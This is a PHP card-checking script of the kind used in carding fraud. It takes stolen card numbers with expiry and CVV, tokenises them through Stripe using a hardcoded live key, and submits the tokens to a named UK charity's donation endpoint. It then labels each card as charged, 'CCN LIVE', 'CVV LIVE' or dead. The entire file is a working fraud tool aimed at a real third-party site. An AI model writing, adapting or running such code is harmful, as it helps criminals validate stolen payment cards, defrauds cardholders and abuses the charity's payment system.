<?php
header('Content-Type: application/json');

function check_card_details($card) {
    $cc_details = explode('|', $card);
    if (count($cc_details) != 4) {
        return json_encode(['status' => 'error', 'message' => 'Invalid card format.']);
    }

    list($cc, $mes, $ano, $cvv) = $cc_details;

    if (strlen($mes) == 1) {
        $mes = "0" . $mes;
    }
    if (strlen($ano) == 2) {
        $ano = "20" . $ano;
    }

    // 1st Request
    $token_url = "https://api.stripe.com/v1/tokens";
    $headers_1 = [
        'Accept: application/json',
        'Content-Type: application/x-www-form-urlencoded',
        'User-Agent: Mozilla/5.0'
    ];
    $data_1 = http_build_query([
        'card[number]' => $cc,
        'card[cvc]' => $cvv,
        'card[exp_month]' => $mes,
        'card[exp_year]' => $ano,
        'key' => 'pk_live_oeBlScsEPKeBvHnRXizVNSl4'
    ]);

    $ch = curl_init($token_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers_1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response_1 = curl_exec($ch);
    curl_close($ch);

    $result_1 = json_decode($response_1, true);

    if (!isset($result_1['id'])) {
        return json_encode(['status' => 'error', 'message' => $result_1['error']['message'] ?? 'Unknown error']);
    }

    $token_id = $result_1['id'];

    // 2nd Request
    $donation_url = "https://oneummah.org.uk/wp-admin/admin-ajax.php";
    $headers_2 = [
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Content-Type: application/x-www-form-urlencoded',
        'User-Agent: Mozilla/5.0'
    ];
    $data_2 = http_build_query([
        'action' => 'k14_submit_donation',
        'token' => $token_id,
        'data' => 'donation_id=360485'
    ]);

    $ch = curl_init($donation_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers_2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_2);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response_2 = curl_exec($ch);
    curl_close($ch);

    if (strpos($response_2, 'payment_intent_unexpected_state') !== false) {
        return json_encode(['status' => 'hit', 'message' => 'Payment Intent Confirmed']);
    } elseif (strpos($response_2, 'succeeded') !== false) {
        return json_encode(['status' => 'hit', 'message' => 'CHARGED✅']);
    } elseif (strpos($response_2, 'Your card has insufficient funds.') !== false) {
        return json_encode(['status' => 'dead', 'message' => 'INSUFFICIENT FUNDS❎']);
    } elseif (strpos($response_2, 'incorrect_zip') !== false) {
        return json_encode(['status' => 'cvv', 'message' => 'CVV LIVE❎']);
    } elseif (strpos($response_2, 'insufficient_funds') !== false) {
        return json_encode(['status' => 'dead', 'message' => 'INSUFFICIENT FUNDS❎']);
    } elseif (strpos($response_2, 'security code is incorrect') !== false) {
        return json_encode(['status' => 'ccn', 'message' => 'CCN LIVE❎']);
    } elseif (strpos($response_2, 'Your card\'s security code is invalid.') !== false) {
        return json_encode(['status' => 'ccn', 'message' => 'CCN LIVE❎']);
    } elseif (strpos($response_2, 'transaction_not_allowed') !== false) {
        return json_encode(['status' => 'cvv', 'message' => 'CVV LIVE❎']);
    } elseif (strpos($response_2, 'stripe_3ds2_fingerprint') !== false) {
        return json_encode(['status' => 'dead', 'message' => '3D REQUIRED']);
    } elseif (strpos($response_2, 'redirect_url') !== false) {
        return json_encode(['status' => 'dead', 'message' => 'Approved\n3DS Required❎']);
    } elseif (strpos($response_2, '"cvc_check": "pass"') !== false) {
        return json_encode(['status' => 'hit', 'message' => 'CHARGED✅']);
    } elseif (strpos($response_2, 'Membership Confirmation') !== false) {
        return json_encode(['status' => 'hit', 'message' => 'Membership Confirmation✅']);
    } elseif (strpos($response_2, 'Thank you for your support!') !== false) {
        return json_encode(['status' => 'hit', 'message' => 'CHARGED✅']);
    } elseif (strpos($response_2, 'Thank you for your donation') !== false) {
        return json_encode(['status' => 'hit', 'message' => 'CHARGED✅']);
    } elseif (strpos($response_1, 'incorrect_number') !== false) {
        return json_encode(['status' => 'dead', 'message' => 'Your card number is incorrect.❌']);
    } elseif (strpos($response_2, '"status":"incomplete"') !== false) {
        return json_encode(['status' => 'dead', 'message' => 'Your card was declined.❌']);
    } elseif (strpos($response_2, 'Your card was declined.') !== false) {
        return json_encode(['status' => 'dead', 'message' => 'Your card was declined.❌']);
    } elseif (strpos($response_2, 'card_declined') !== false) {
        return json_encode(['status' => 'dead', 'message' => 'Your card was declined.❌']);
    } else {
        try {
            $result_2_json = json_decode($response_2, true);
            if (isset($result_2_json['message'])) {
                return json_encode(['status' => 'dead', 'message' => 'DEAD\nMessage: ' . $result_2_json['message']]);
            } else {
                return json_encode(['status' => 'dead', 'message' => 'DEAD\nRaw response 2: ' . $response_2]);
            }
        } catch (Exception $e) {
            return json_encode(['status' => 'dead', 'message' => 'DEAD\nRaw response 2: ' . $response_2]);
        }
    }
}

if (isset($_POST['cc'])) {
    $card = $_POST['cc'];
    echo check_card_details($card);
} else {
    echo json_encode(['status' => 'error', 'message' => 'No card details provided.']);
}
?>